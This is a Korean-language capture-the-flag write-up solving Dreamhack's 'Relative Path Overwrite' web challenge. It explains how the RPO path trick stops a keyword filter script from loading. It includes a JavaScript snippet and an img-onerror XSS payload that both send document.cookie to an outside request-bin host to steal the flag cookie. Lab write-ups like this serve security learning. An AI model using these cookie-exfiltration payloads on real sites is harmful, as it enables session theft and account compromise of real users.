---
title: "드림핵 lv.2 - Relative Path Overwrite"
date: 2025-03-26 00:00:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, rpo, relative path overwrite] 
description: 드림핵 Relative Path Overwrite 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/439](https://dreamhack.io/wargame/challenges/439)
# 문제 설명
Exercise: Relative Path Overwrite에서 실습하는 문제입니다.

---
# 문제 풀이
## 웹사이트 분석
### / 페이지
메인에 들어가면 "Welcome to rpo world"라는 문구만 뜨고 위의 Nav 바가 보인다.
### /?page=report 페이지
이번 페이지에선 `http://127.0.0.1/` 호스트로 어떠한 요청을 보낼 수 있는 기능이 보인다.
### /?page=vuln 페이지
해당 페이지에는 param 값을 받아와서 출력해주는 기능을 하고있다.<br />

개발자 도구를 통해서 코드를 볼 수 있는데 여기서 filter.js라는 파일에 있는 필터링 키워드에 해당하는 값이 param으로 전달되면 "nope !!"이라는 문자를 출력하는 기능이 있다.<br />
`var filter = ["script", "on", "frame", "object"];` 필터링하고 있는 키워드 리스트는 이와 같다. 스크립트를 활용한 XSS 공격을 필터링하고 있는 것 같다.
## 코드 분석
### bot.py
```python
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import sys
import base64

if len(sys.argv) < 2:
    exit(-1)

if len(sys.argv[1]) == 0:
    exit(-1)

path = base64.b64decode(sys.argv[1]).decode('latin-1')

try:
    FLAG = open('/flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

def read_url(url, cookie={'name': 'name', 'value': 'value'}):
    cookie.update({'domain':'127.0.0.1'})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in ['headless', 'window-size=1920x1080', 'disable-gpu', 'no-sandbox', 'disable-dev-shm-usage']:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get('http://127.0.0.1/')
        driver.add_cookie(cookie)
        driver.get(url)

    except Exception as e:
        driver.quit()
        return False
    driver.quit()
    return True

def check_xss(path, cookie={'name': 'name', 'value': 'value'}):
    url = f'http://127.0.0.1/{path}'
    return read_url(url, cookie)

if not check_xss(path, {'name': 'flag', 'value': FLAG.strip()}):
    print('<script>alert("wrong??");history.go(-1);</script>')
else:
    print('<script>alert("good");history.go(-1);</script>')
```
다른 코드는 살펴볼 필요가 없을 것 같은데 Selenium 봇을 구현해놓은 코드는 중요해보인다.<br />

/?page=report 페이지에서 어떤 요청을 보낼 때 해당 코드가 실행된다고 보면 된다.<br />
마지막 부분을 보면 check_xss() 함수를 호출하면서 쿠키에 플래그를 담아 요청을 보내는 것이 보인다.<br />

여기서 알 수 있는 것은 127.0.0.1에 저장되는 쿠키 값을 어떻게든 읽어내야한다. 지금 생각해보기로는 아마 vuln 페이지에 출력시키거나 개인 서버를 통해서 값을 받아오면 될 것 같다.
## 최종 풀이
우리가 여기서 이뤄야할 것은 filter.js가 로딩되는 것을 막는 것이다.<br />
그래서 처음에는 `<base>` 태그를 이용해서 filter.js를 내가 적은 코드로 로드하는 것을 생각해보았다.<br />
### `<base>` 태그 이용하기
```js
const Http = new XMLHttpRequest();

const url = "https://hjyqcmp.request.dreamhack.games?data=" + document.cookie;

Http.open("GET", url);
Http.send();

console.log("SUCCESS");
```
내 개인 서버 루트 디렉토리에 filter.js를 위처럼 작성해놓고 페이지가 로드될 때 해당 스크립트가 실행될 수 있도록 Base Uri를 변경해보았다.<br />
하지만 이 방식은 어떤 이유에서인지 filter.js가 내가 작성한 파일이 아닌 원래 파일로 로드가 된다.<br /> Base Uri가 변경되는 것은 확실하게 확인되지만 아마 파일 로딩이 더 빠른 순서로 진행되기 때문인 것 같다.
### RPO 취약점 이용하기
```
/?page=vuln
index.php/?page=vuln
```
첫 번째나 두 번째 모두 같은 페이지에 접속하는 주소이지만 약간 다른 점이 있다.<br />
두 번째 주소로 접근을 하게 되면 `<script src="filter.js"></script>` 이 부분이 `index.php/filter.js` 파일을 불러오는 식으로 행동한다. 하지만 당연하게도 index.php는 디렉토리가 아니라 파일 이름이라 filter.js를 제대로 불러오지 못하고 그냥 Index.php를 리턴한다.<br />

개발자 도구의 Network 탭을 보면 페이지에서 일어나는 각종 요청들을 볼 수 있는데 그때 filter.js  대신 index.php가 리턴되는 것이 확인된다.<br />

즉, 이로써 우리는 필터링을 우회할 수 있다는 말이다.<br />

```
index.php/?page=vuln&param=<img src="abcd" onerror=location.href="https://xxwicua.request.dreamhack.games/"%2bdocument.cookie>
```
이런식으로 페이로드를 작성하고 /?page=report 페이지에 접속해서 제출하면 Request Bin에서 플래그를 얻을 수 있다.
# 배운 것
Network 탭을 바라보면서 각종 요청들을 지켜보는 것도 중요하구나를 느낄 수 있었고 RPO 취약점의 기본 원리와 작동 방식을 익힐 수 있었다.